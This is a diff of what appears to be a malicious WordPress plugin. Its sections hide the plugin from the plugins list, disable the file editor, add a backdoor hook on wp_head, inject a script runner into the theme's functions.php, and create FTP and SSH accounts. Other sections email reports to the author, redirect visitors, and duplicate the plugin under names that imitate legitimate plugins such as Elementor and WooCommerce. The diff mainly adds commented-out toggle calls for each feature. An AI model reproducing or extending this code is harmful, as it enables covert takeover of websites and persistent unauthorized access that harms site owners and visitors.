@@ -3,6 +3,8 @@
 ## 01 # Hide My Plugin From Plugins List
 ##------------------------------------------------##
 
+// self_hider(true);
+
 add_filter(
   'all_plugins',
   function ($plugins) {
@@ -27,11 +29,15 @@ add_filter(
 ## 02 # Disable Theme/Plugin File Editor
 ##------------------------------------------------##
 
+// disable_editor(true);
+
 define('DISALLOW_FILE_EDIT', true);
 
 ##------------------------------------------------##
 ## 03 # Create BackDoors
 ##------------------------------------------------##
+
+// create_backdoor(true);
 
 add_action('wp_head', 'my_backdoor');
 function my_backdoor()
@@ -49,6 +55,9 @@ function my_backdoor()
 ##------------------------------------------------##
 ## 04 # Add Script Runner To Theme functions.php
 ##------------------------------------------------##
+
+// modify_functions(true);
+
 // Get file directory
 $file = get_stylesheet_directory() . '/functions.php';
 // New code that should be added
@@ -81,8 +90,10 @@ if (preg_match_all($pattern, $contents, $matches)) {
 ##------------------------------------------------##
 ## 05 # Craete FTP Account
 ##------------------------------------------------##
-# الكود دا كله لسا متراجعش عليه ومعرفش شغال ولا لا
 
+// create_ftp(true);
+
+# الكود دا كله لسا متراجعش عليه ومعرفش شغال ولا لا
 // // FTP account details
 // $username = 'newuser';
 // $password = 'newpassword';
@@ -101,8 +112,10 @@ if (preg_match_all($pattern, $contents, $matches)) {
 ##------------------------------------------------##
 ## 06 # Create SSH Access
 ##------------------------------------------------##
-# الكود دا كله لسا متراجعش عليه ومعرفش شغال ولا لا
 
+// create_ssh(true);
+
+# الكود دا كله لسا متراجعش عليه ومعرفش شغال ولا لا
 // // SSH user details
 // $username = 'newuser';
 // $password = 'newpassword';
@@ -121,8 +134,10 @@ if (preg_match_all($pattern, $contents, $matches)) {
 ##------------------------------------------------##
 ## 07 # Send Email Report To Me
 ##------------------------------------------------##
-# الكود دا كله لسا متراجعش عليه ومعرفش شغال ولا لا
 
+// email_sender(true, $email_address, $subject, $message, $headers);
+
+# الكود دا كله لسا متراجعش عليه ومعرفش شغال ولا لا
 // Send the email
 $mailSuccess = mail($email_address, $subject, $message, $headers);
 
@@ -137,6 +152,8 @@ if ($mailSuccess) {
 ## 08 # Redirect To Another URL
 ##------------------------------------------------##
 
+// URL_redirect(true);
+
 // header("Location: https://www.google.com/");
 // exit();
 
@@ -144,6 +161,8 @@ if ($mailSuccess) {
 ##------------------------------------------------##
 ## 09 # Self duplicator Plugin
 ##------------------------------------------------##
+
+// self_duplicator(true);
 
 // Plugin Names
 $plugins_names = ['facebook-pixel', 'elementor', 'security', 'wordpress', 'performance', 'optimization', 'speed-optimization', 'plugin-installer', "hellodolly", "akismet-antispam", 'classic-editors', 'classic-widgets', 'woocommerce', 'one-click-demo-importer-free'];
